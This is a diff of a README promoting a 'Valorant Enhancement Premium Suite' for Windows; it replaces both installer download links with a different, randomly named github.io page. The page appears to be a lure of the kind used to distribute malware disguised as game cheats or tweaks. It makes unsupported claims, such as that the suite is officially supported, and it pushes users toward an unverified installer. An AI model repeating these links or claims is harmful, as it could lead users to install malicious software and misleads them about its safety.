@@ -2,7 +2,7 @@
 
 The Valorant Enhancement Premium Suite is a comprehensive desktop application designed for players seeking to personalize their tactical shooter experience on Windows. This 2026 release offers a curated set of utilities for cosmetic customization and performance tuning, aiming to provide a private and stable toolset for enthusiasts.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -50,7 +50,7 @@ A: No, the Valorant Enhancement Premium Suite is officially supported and tested
 
 You can download the latest stable version of the installer directly from our official GitHub page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
